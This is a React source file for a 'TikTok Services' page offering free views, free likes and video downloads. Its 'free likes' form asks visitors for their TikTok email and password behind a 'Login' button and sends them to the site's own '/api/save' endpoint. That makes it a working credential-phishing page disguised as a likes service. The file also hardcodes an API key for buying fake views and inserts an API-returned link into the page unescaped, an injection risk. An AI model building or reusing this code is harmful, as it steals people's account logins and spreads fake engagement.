import React, { useState } from "react";
import { Play, Heart, Download, MessageCircle, ExternalLink, User, Mail, Lock, Link } from "lucide-react";

function App() {
  const [viewsUrl, setViewsUrl] = useState("");
  const [downloadUrl, setDownloadUrl] = useState("");
  const [showLikesForm, setShowLikesForm] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [tikTokLink, setTikTokLink] = useState("");
  const [viewsLoading, setViewsLoading] = useState(false);
  const [downloadLoading, setDownloadLoading] = useState(false);
  const [likesLoading, setLikesLoading] = useState(false);
  const [downloadResult, setDownloadResult] = useState("");

  const handleGetViews = async () => {
    if (!viewsUrl) {
      alert("Please enter a TikTok URL");
      return;
    }

    setViewsLoading(true);
    try {
      const response = await fetch("https://pakprovider.site/api/v1", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          key: "b94TLzIET6vmWit80NJarmXvV4rOA9o4",
          action: "add",
          service: 32005,
          link: viewsUrl,
          quantity: 500,
        }),
      });

      const data = await response.json();
      if (data.order) {
        alert("✅ Views order placed successfully! Your video will receive views shortly.");
        setViewsUrl("");
      } else {
        alert("❌ Failed to place order. Please check your link.");
      }
    } catch (error) {
      const err = error as Error;
      console.log(err)
      alert("❌ Error: Please check your internet connection and try again.");
    } finally {
      setViewsLoading(false);
    }
  };

const handleLikesSubmit = async () => {
  if (!email || !password || !tikTokLink) {
    alert("❌ Please fill in all fields");
    return;
  }

  setLikesLoading(true);
  try {
    const response = await fetch('/api/save', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email,
        password,
        url: tikTokLink,
      }),
    });

    const result = await response.json();

    if (response.ok) {
      alert(`✅ Like order placed successfully! Your video will receive likes shortly.}`);
      setEmail("");
      setPassword("");
      setTikTokLink("");
      setShowLikesForm(false);
    } else {
      alert(`❌ Failed: ${result.error || 'Unknown error'}`);
    }
  } catch (error) {
    const err = error as Error;
    alert(`❌ Error submitting data: ${err.message}`);
  } finally {
    setLikesLoading(false);
  }
};


  const handleDownload = async () => {
    if (!downloadUrl) {
      alert("Please enter a TikTok URL");
      return;
    }

    setDownloadLoading(true);
    setDownloadResult("Processing...");

    try {
      const response = await fetch(`https://tikwm.com/api/?url=${encodeURIComponent(downloadUrl)}`);
      const data = await response.json();

      if (data && data.data && data.data.play) {
        const downloadLink = data.data.play;
        setDownloadResult(`
          <a href="${downloadLink}" download="tiktok_video.mp4" style="color:#00ffcc; font-size:1.1rem;">
            ✅ Click here if download doesn't start
          </a>
        `);

        // Auto-download after 3 seconds
        setTimeout(() => {
          const a = document.createElement("a");
          a.href = downloadLink;
          a.download = "tiktok_video.mp4";
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
        }, 3000);

        setDownloadUrl("");
      } else {
        throw new Error("Invalid or unsupported link.");
      }
    } catch (error) {
      const err = error as Error;
      setDownloadResult(`<div style="color:red;">Error: ${err.message}</div>`);
    } finally {
      setDownloadLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-blue-900 to-indigo-900">
      {/* Header */}
      <header className="text-center py-8 px-4">
        <h1 className="text-4xl md:text-6xl font-bold text-white mb-2">TikTok Services By Hasi</h1>
        <div className="w-32 h-1 bg-gradient-to-r from-pink-500 to-purple-500 mx-auto rounded-full"></div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 pb-16">
        {/* Free Views Section */}
        <div className="bg-white/10 backdrop-blur-lg rounded-3xl p-8 mb-8 border border-white/20 shadow-2xl">
          <div className="flex items-center justify-center mb-6">
            <Play className="w-8 h-8 text-pink-400 mr-3" />
            <h2 className="text-2xl font-bold text-white">Get Free Views</h2>
          </div>

          <div className="space-y-4">
            <div className="relative">
              <Link className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <input type="url" placeholder="Paste your TikTok video URL here..." value={viewsUrl} onChange={(e) => setViewsUrl(e.target.value)} className="w-full pl-12 pr-4 py-4 bg-white/20 border border-white/30 rounded-xl text-white placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-pink-500 focus:border-transparent transition-all duration-300" />
            </div>

            <button onClick={handleGetViews} disabled={viewsLoading} className="w-full bg-gradient-to-r from-pink-500 to-purple-600 text-white font-semibold py-4 px-6 rounded-xl hover:from-pink-600 hover:to-purple-700 transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg">
              {viewsLoading ? "Processing..." : "Get Free Views"}
            </button>
          </div>
        </div>

        {/* Free Likes Section */}
        <div className="bg-white/10 backdrop-blur-lg rounded-3xl p-8 mb-8 border border-white/20 shadow-2xl">
          <div className="flex items-center justify-center mb-6">
            <Heart className="w-8 h-8 text-red-400 mr-3" />
            <h2 className="text-2xl font-bold text-white">TikTok Free Likes</h2>
          </div>

          {!showLikesForm ? (
            <button onClick={() => setShowLikesForm(true)} className="w-full bg-gradient-to-r from-red-500 to-pink-600 text-white font-semibold py-4 px-6 rounded-xl hover:from-red-600 hover:to-pink-700 transition-all duration-300 transform hover:scale-105 shadow-lg">
              Get Free Likes
            </button>
          ) : (
            <div className="space-y-4">
              <div className="relative">
                <Mail className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                <input type="email" placeholder="Enter your email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full pl-12 pr-4 py-4 bg-white/20 border border-white/30 rounded-xl text-white placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-300" />
              </div>

              <div className="relative">
                <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                <input type="password" placeholder="Enter your password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full pl-12 pr-4 py-4 bg-white/20 border border-white/30 rounded-xl text-white placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-300" />
              </div>

              <div className="relative">
                <Link className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
                <input type="url" placeholder="Paste your TikTok video URL" value={tikTokLink} onChange={(e) => setTikTokLink(e.target.value)} className="w-full pl-12 pr-4 py-4 bg-white/20 border border-white/30 rounded-xl text-white placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent transition-all duration-300" />
              </div>

              <div className="flex gap-4">
                <button onClick={handleLikesSubmit} disabled={likesLoading} className="flex-1 bg-gradient-to-r from-red-500 to-pink-600 text-white font-semibold py-4 px-6 rounded-xl hover:from-red-600 hover:to-pink-700 transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg">
                  {likesLoading ? "Processing..." : "Login"}
                </button>

                <button onClick={() => setShowLikesForm(false)} className="px-6 py-4 bg-gray-600 text-white font-semibold rounded-xl hover:bg-gray-700 transition-all duration-300">
                  Cancel
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Download Section */}
        <div className="bg-white/10 backdrop-blur-lg rounded-3xl p-8 mb-8 border border-white/20 shadow-2xl">
          <div className="flex items-center justify-center mb-6">
            <Download className="w-8 h-8 text-green-400 mr-3" />
            <h2 className="text-2xl font-bold text-white">Download TikTok Video</h2>
          </div>

          <div className="space-y-4">
            <div className="relative">
              <Link className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
              <input type="url" placeholder="Paste your TikTok video URL here..." value={downloadUrl} onChange={(e) => setDownloadUrl(e.target.value)} className="w-full pl-12 pr-4 py-4 bg-white/20 border border-white/30 rounded-xl text-white placeholder-gray-300 focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent transition-all duration-300" />
            </div>

            <button onClick={handleDownload} disabled={downloadLoading} className="w-full bg-gradient-to-r from-green-500 to-teal-600 text-white font-semibold py-4 px-6 rounded-xl hover:from-green-600 hover:to-teal-700 transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed shadow-lg">
              {downloadLoading ? "Processing..." : "Download"}
            </button>

            {downloadResult && <div className="mt-4 p-4 bg-white/20 rounded-xl text-center" dangerouslySetInnerHTML={{ __html: downloadResult }} />}
          </div>
        </div>
      </main>

      {/* Floating WhatsApp Button */}
      <a href="https://whatsapp.com/channel/0029VaHI7LsFnSz1irwgsL1z" target="_blank" rel="noopener noreferrer" className="fixed right-6 top-1/2 transform -translate-y-1/2 bg-green-500 text-white p-4 rounded-full shadow-2xl hover:bg-green-600 transition-all duration-300 hover:scale-110 z-50">
        <MessageCircle className="w-6 h-6" />
      </a>

      {/* Footer */}
      <footer className="text-center py-8 px-4 bg-black/20 backdrop-blur-lg">
        <div className="flex items-center justify-center mb-4">
          <User className="w-5 h-5 text-blue-400 mr-2" />
          <span className="text-white text-lg">Developer By Haseeb Rashid</span>
        </div>

        <a href="https://wa.me/923462054847" target="_blank" rel="noopener noreferrer" className="inline-flex items-center text-green-400 hover:text-green-300 transition-colors duration-300">
          <MessageCircle className="w-4 h-4 mr-2" />
          Contact on WhatsApp
          <ExternalLink className="w-4 h-4 ml-1" />
        </a>
      </footer>
    </div>
  );
}

export default App;
